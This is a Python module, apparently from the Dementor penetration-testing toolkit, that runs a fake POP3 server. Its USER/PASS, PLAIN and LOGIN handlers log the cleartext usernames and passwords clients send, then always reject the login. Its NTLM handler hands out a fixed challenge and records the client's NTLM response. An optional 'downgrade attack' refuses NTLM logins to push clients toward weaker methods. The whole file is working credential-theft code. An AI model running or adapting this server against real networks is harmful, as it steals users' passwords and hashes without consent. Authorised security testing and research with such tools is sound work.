# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# Basic implementation of a POP3 server based on:
#   - https://datatracker.ietf.org/doc/html/rfc1939
#   - https://datatracker.ietf.org/doc/html/rfc5034
#   - https://www.ietf.org/rfc/rfc2449.txt
#   - https://www.rfc-editor.org/rfc/rfc1734
#   - https://datatracker.ietf.org/doc/html/rfc4616
#   - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pop3/
import base64
import binascii

from impacket import ntlm
from dementor.protocols.ntlm import (
    NTLM_AUTH_CreateChallenge,
    NTLM_report_auth,
    NTLM_split_fqdn,
    ATTR_NTLM_CHALLENGE,
    ATTR_NTLM_ESS,
)
from dementor.servers import (
    ServerThread,
    ThreadingTCPServer,
    BaseProtoHandler,
    create_tls_context,
)
from dementor.logger import ProtocolLogger
from dementor.database import _CLEARTEXT
from dementor.config.toml import (
    TomlConfig,
    Attribute as A,
)
from dementor.config.attr import ATTR_TLS, ATTR_CERT, ATTR_KEY
from dementor.config.util import get_value


def apply_config(session):
    session.pop3_config = list(
        map(POP3ServerConfig, get_value("POP3", "Server", default=[]))
    )


def create_server_threads(session):
    return [
        ServerThread(
            session,
            POP3Server,
            server_config=config,
            server_address=(session.bind_address, config.pop3_port),
        )
        for config in (session.pop3_config if session.pop3_enabled else [])
    ]


POP3_AUTH_MECHANISMS = [
    "PLAIN",
    "LOGIN",
    "NTLM",
    # NOT YET IMPLEMENTED
    # "GSSAPI",
]


class POP3ServerConfig(TomlConfig):
    _section_ = "POP3"
    _fields_ = [
        A("pop3_port", "Port"),
        A("pop3_fqdn", "FQDN", "Dementor", section_local=False),
        A("pop3_downgrade", "Downgrade", True),
        A("pop3_banner", "Banner", "POP3 Server ready"),
        A("pop3_auth_mechs", "AuthMechanisms", POP3_AUTH_MECHANISMS),
        ATTR_CERT,
        ATTR_KEY,
        ATTR_TLS,
        ATTR_NTLM_CHALLENGE,
        ATTR_NTLM_ESS,
    ]


class CloseConnection(Exception):
    pass


class POP3Handler(BaseProtoHandler):
    def __init__(self, config, server_config, request, client_address, server) -> None:
        self.server_config = server_config
        super().__init__(config, request, client_address, server)

    def proto_logger(self) -> ProtocolLogger:
        return ProtocolLogger(
            extra={
                "protocol": "POP3",
                "protocol_color": "blue_violet",
                "host": self.client_host,
                "port": self.server_config.pop3_port,
            }
        )

    def ok(self, msg: str) -> None:
        self.line(msg, "+OK")

    def err(self, msg: str) -> None:
        self.line(msg, "-ERR")

    def line(self, msg: str, prefix: str | None = None) -> None:
        line = str(msg)
        if prefix:
            line = f"{prefix} {line}"
        self.logger.debug(repr(line), is_server=True)
        self.send(f"{line}\r\n".encode("utf-8", "strict"))

    def challenge_auth(
        self,
        token: bytes | None = None,
        decode: bool = False,
        prefix: str | None = None,
    ) -> bytes | str:
        line = prefix or "+"
        if token:
            line = f"{line} {base64.b64encode(token).decode()}"

        self.line(line)
        resp = self.rfile.readline(1024).strip().decode("utf-8", errors="replace")
        self.logger.debug(repr(resp), is_client=True)
        # A client response consists of a line containing a string
        # encoded as Base64.  If the client wishes to cancel the
        # authentication exchange, it issues a line with a single "*".
        # If the server receives such a response, it MUST reject the AUTH
        # command by sending an -ERR reply.
        if resp == "*":
            self.err("Authentication canceled")
            raise CloseConnection

        response = base64.b64decode(resp)
        if decode:
            response = response.decode("utf-8", errors="replace")
        return response

    def handle_data(self, data, transport):
        self.request.settimeout(2)
        self.rfile = transport.makefile("rb")

        # 4. The AUTHORIZATION State
        # Once the TCP connection has been opened by a POP3 client, the POP3
        # server issues a one line greeting.
        self.ok(self.server_config.pop3_banner)

        # The POP3 session is now in the AUTHORIZATION state.  The client must
        # now identify and authenticate itself to the POP3 server.
        while line := self.rfile.readline(1024):
            line = line.decode("utf-8", errors="replace").strip()
            self.logger.debug(repr(line), is_client=True)

            args = line.split(" ")
            if len(args) > 0:
                method = getattr(self, f"do_{args[0].upper()}", None)
                if method:
                    try:
                        method(args[1:])
                    except CloseConnection:
                        break
                continue

            self.logger.debug(f"Unknown command: {line!r}")
            self.err("Unknown command")

    # Implementation
    # [rfc1939] 4. The AUTHORIZATION State
    #   QUIT
    def do_QUIT(self, args):
        self.ok("Goodbye")
        raise CloseConnection

    # [rfc1939] 7. Optional POP3 Commands
    #  USER
    def do_USER(self, args):
        if len(args) != 1:
            self.err("Invalid number of arguments")
            return

        self.username = args[0]
        self.ok("Username accepted")

    # [rfc1939] 7. Optional POP3 Commands
    #  PASS
    def do_PASS(self, args):
        if len(args) < 1:
            return self.err("Invalid number of arguments")
            return

        if not hasattr(self, "username"):
            return self.err("Username not set")

        # rfc1939]
        # Since the PASS command has exactly one argument, a POP3
        # server may treat spaces in the argument as part of the
        # password, instead of as argument separators.
        self.password = " ".join(args)
        self.config.db.add_auth(
            client=self.client_address,
            username=self.username,
            password=self.password,
            logger=self.logger,
            credtype=_CLEARTEXT,
        )
        del self.username
        del self.password
        self.err("Invalid username or password")

    # [rfc2449] 5.  The CAPA Command
    #   CAPA
    def do_CAPA(self, args):
        self.ok("Capability list follows")
        # The USER capability indicates that the USER and PASS commands
        # are supported, although they may not be available to all users
        self.line("USER")
        self.line("TOP")

        auth_mechanisms = " ".join(self.server_config.pop3_auth_mechs)
        self.line(f"SASL {auth_mechanisms}")
        # When all lines of the response have been sent, a final line is sent,
        # consisting of a termination octet (decimal code 046, ".") and a CRLF pair.
        self.line(".")

    # [rfc1734] 2. The AUTH command
    #   AUTH
    def do_AUTH(self, args):
        if len(args) != 1:
            self.err("Invalid number of arguments")
            return

        auth_mechanism = args[0]
        if len(auth_mechanism) == 0:
            # According to [MS-POP3]:
            # A client can query the server to learn whether or not NTLM is supported.
            # This is accomplished by issuing the AUTH command without any parameters.
            self.ok("")
            # The server responds to this message with a message followed by a list of
            # supported authentication mechanisms, followed by a list termination message.
            for auth_mechanism in self.server_config.pop3_auth_mechs:
                self.line(auth_mechanism)
            return self.line(".")

        method = getattr(self, f"auth_{auth_mechanism.upper()}", None)
        if method:
            return method(*args[1:])

        self.err("Unrecognized authentication type")

    # [rfc4616] 2.  PLAIN SASL Mechanism
    #   PLAIN
    def auth_PLAIN(self, initial_response=None):
        if not initial_response:
            initial_response = self.challenge_auth(decode=True)

        try:
            # The mechanism consists of a single message, a string of [UTF-8]
            # encoded [Unicode] characters, from the client to the server.  The
            # client presents the authorization identity (identity to act as),
            # followed by a NUL (U+0000) character, followed by the authentication
            # identity (identity whose password will be used), followed by a NUL
            # (U+0000) character, followed by the clear-text password.
            _, login, password = initial_response.split("\x00")
        except ValueError:
            return self.err("Invalid login data")

        self.config.db.add_auth(
            client=self.client_address,
            username=login,
            password=password,
            logger=self.logger,
            credtype=_CLEARTEXT,
        )
        self.err("Invalid username or password")

    # https://datatracker.ietf.org/doc/html/draft-murchison-sasl-login-00
    #   LOGIN
    def auth_LOGIN(self, username: bytes | None = None):
        if not username:
            # The server issues the string "User Name" in challenge, and receives a
            # client response.  This response is recorded as the authorization
            # identity.
            token = base64.b64encode(b"User Name\x00")
            username = self.challenge_auth(token, decode=True)
        else:
            try:
                username = base64.b64decode(username).decode(errors="replace")
            except binascii.Error:
                return self.err("Invalid username")

        # The server then issues the string "Password" in challenge,
        # and receives a client response.  This response is recorded as the
        # authorization authenticator.
        token = base64.b64encode(b"Password\x00")
        password = self.challenge_auth(token, decode=True)

        self.config.db.add_auth(
            client=self.client_address,
            username=username,
            password=password,
            logger=self.logger,
            credtype=_CLEARTEXT,
        )
        self.err("Invalid username or password")

    # [MS-POP3]: NT LAN Manager (NTLM) Authentication
    #   NTLM
    def auth_NTLM(self, initial_response=None) -> None:
        # 2. The server sends the POP3_NTLM_Supported_Response message,
        # indicating that it can perform NTLM authentication.
        if not initial_response:
            token = self.challenge_auth()
        else:
            token = base64.b64decode(initial_response)

        # 3. The client sends a POP3_AUTH_NTLM_Blob_Command message containing
        # a base64-encoded NTLM NEGOTIATE_MESSAGE.
        negotiate = ntlm.NTLMAuthNegotiate()
        negotiate.fromString(token)

        # 3. The server sends a POP3_AUTH_NTLM_Blob_Response message containing
        # a base64-encoded NTLM CHALLENGE_MESSAGE.
        challenge = NTLM_AUTH_CreateChallenge(
            negotiate,
            *NTLM_split_fqdn(self.server_config.pop3_fqdn),
            challenge=self.server_config.ntlm_challenge,
            disable_ess=not self.server_config.ntlm_ess,
        )
        token = self.challenge_auth(challenge.getData())

        # The client sends a POP3_AUTH_NTLM_Blob_Command message containing a
        # base64-encoded NTLM AUTHENTICATE_MESSAGE.
        auth_message = ntlm.NTLMAuthChallengeResponse()
        auth_message.fromString(token)

        NTLM_report_auth(
            auth_message,
            challenge=self.server_config.ntlm_challenge,
            client=self.client_address,
            logger=self.logger,
            session=self.config,
        )
        if self.server_config.pop3_downgrade:
            self.logger.display(f"Performing downgrade attack on {self.client_host}")
            return self.err("Invalid username or password")

        self.ok("User successfully logged on")


class POP3Server(ThreadingTCPServer):
    default_port = 110
    default_handler_class = POP3Handler
    service_name = "POP3"

    def __init__(
        self,
        config,
        server_address=None,
        RequestHandlerClass: type | None = None,
        server_config: POP3ServerConfig | None = None,
    ) -> None:
        self.server_config = server_config
        super().__init__(config, server_address, RequestHandlerClass)
        self.ssl_context = create_tls_context(self.server_config, self)
        if self.ssl_context:
            self.socket = self.ssl_context.wrap_socket(self.socket, server_side=True)

    def finish_request(self, request, client_address) -> None:
        self.RequestHandlerClass(
            self.config, self.server_config, request, client_address, self
        )
